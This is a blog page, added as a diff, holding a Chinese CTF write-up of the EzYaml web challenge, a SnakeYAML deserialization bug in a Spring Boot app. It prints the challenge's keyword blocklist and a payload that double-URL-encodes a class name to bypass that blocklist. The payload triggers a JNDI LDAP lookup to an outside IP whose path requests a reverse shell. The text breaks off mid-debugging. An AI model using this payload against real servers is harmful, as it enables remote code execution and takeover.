@@ -1,0 +1,1526 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="部分web题的wp">
+<title>第九届封神台ctf</title>
+
+<link rel='canonical' href='https://fupanc-w1n.github.io/p/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%B0%81%E7%A5%9E%E5%8F%B0ctf/'>
+
+<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="第九届封神台ctf">
+<meta property='og:description' content="部分web题的wp">
+<meta property='og:url' content='https://fupanc-w1n.github.io/p/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%B0%81%E7%A5%9E%E5%8F%B0ctf/'>
+<meta property='og:site_name' content='fupanc'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-13T09:03:52&#43;08:00'/><meta property='article:modified_time' content='2025-08-13T09:03:52&#43;08:00'/>
+<meta name="twitter:title" content="第九届封神台ctf">
+<meta name="twitter:description" content="部分web题的wp">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fupanc</a></h1>
+            <h2 class="site-description">我与我周旋久，宁做我</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fupanc-w1n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#ezyaml">EzYaml</a></li>
+        <li><a href="#ezreveal">EzReveal</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #2a9d8f; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%B0%81%E7%A5%9E%E5%8F%B0ctf/">第九届封神台ctf</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            部分web题的wp
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-08-13</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="web">WEB
+</h1><p>这次比赛虽然大部分都是国外的原题，但是都是我没做过的，这里就简单记录一下当时自己做过的并且有意思的题。</p>
+<h3 id="ezyaml">EzYaml
+</h3><p>感觉又是snakeyaml反序列化，下载拿到jar包后便编译，springboot，有如下依赖：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-boot-2.7.5.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-boot-autoconfigure-2.7.5.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/logback-classic-1.2.11.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/logback-core-1.2.11.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/log4j-api-2.17.2.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jul-to-slf4j-1.7.36.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/snakeyaml-1.30.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jackson-databind-2.13.4.2.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jackson-annotations-2.13.4.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jackson-core-2.13.4.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jackson-datatype-jdk8-2.13.4.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jackson-datatype-jsr310-2.13.4.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/jackson-module-parameter-names-2.13.4.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/tomcat-embed-core-9.0.68.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/tomcat-embed-el-9.0.68.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/tomcat-embed-websocket-9.0.68.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-web-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-beans-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-webmvc-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-aop-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-context-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-expression-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/lombok-1.18.24.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/slf4j-api-1.7.36.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-core-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-jcl-5.3.23.jar&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="s2">&#34;BOOT-INF/lib/spring-boot-jarmode-layertools-2.7.5.jar&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到存在snakeyaml依赖，再看路由：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@PostMapping</span><span class="p">({</span><span class="s">&#34;/config&#34;</span><span class="p">})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@ResponseBody</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">config</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">yaml</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">configMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">Common</span><span class="p">.</span><span class="na">isValid</span><span class="p">(</span><span class="n">yaml</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">yaml</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">yaml</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Common</span><span class="p">.</span><span class="na">exampleConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Yaml</span><span class="w"> </span><span class="n">parse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Yaml</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parse</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="n">yaml</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="n">methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethods</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">methods</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="n">BeanUtil</span><span class="p">.</span><span class="na">PREFIX_GETTER_GET</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getParameterCount</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">name</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">configMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">3</span><span class="p">),</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">config</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">).</span><span class="na">toString</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">configMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到存在snakeyaml反序列化漏洞，只不过对内容进行了检测，跟进自定义的Common类的isValid()方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.ctf.yamlconfig.util</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.beans.PropertyAccessor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/* loaded from: yaml.jar:BOOT-INF/classes/com/ctf/yamlconfig/util/Common.class */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Common</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">exampleConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;!!com.ctf.yamlconfig.config.DataSourceConfig {\n  host: 127.0.0.1,\n  port: 3306,\n  username: SilentE,\n  password: 123456,\n  database: Test,\n  type: mysql,\n  params: \&#34;characterEncoding=utf-8&amp;serverTimezone=GMT&amp;useUnicode=true\&#34;\n}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isValid</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">origin</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">PropertyAccessor</span><span class="p">.</span><span class="na">PROPERTY_KEY_PREFIX</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;]&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;ScriptEngineManager&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;InputStream&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;OutputStream&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;JdbcRowSetImpl&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;jndi&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">origin</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;javax.naming&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到是过滤了我们比较常打的JdbcRowSetImpl和中括号，后面看wp是在传参时使用双重url编码绕过，不是很懂为什么，这里又没有ssrf所以不会再次url解码，难道是<strong>snakeyaml在load()时会自动url解码一次？这是一种特性？</strong></p>
+<p>先打出flag，直接打jndi即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!!com.sun.rowset.%25%34%61dbcRowSetImpl+{dataSourceName%3a+&#34;ldap%3a//47.100.223.173%3a1389/Deserialize/Jackson/ReverseShell/47.100.223.173/2333&#34;,+autoCommit%3a+true}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把J双重编码了：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250812204508644.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250812204508644"
+	
+	
+></p>
+<p>jndi打jackson反序列化，过程不多说了，用的JndiMap工具，最后拿到flag的效果如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250812204145928.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250812204145928"
+	
+	
+></p>
+<p>flag如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{zhuaWa_j1aWa_zh@Wa}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>————————</p>
+<p>现在来简单调试一下过程：</p>
+<p>本地搭建好环境后开始调试：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250812204933942.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250812204933942"
+	
+	
+></p>
+<p>可以看到确实在此时只进行了一次url解码，故这里的J还保持着url编码的格式。然后就会进入正常的Yaml的load()部分：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250812205217198.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250812205217198"
+	
+	
+></p>
+<p>在漫长的调试中，最后找到了实现代码，在一次调试中，看到tag实现了已经解码的标签：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813114659330.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813114659330"
+	
+	
+></p>
+<p>此时的调用栈为：</p>
+<div class="highlight"><div class="chroma">
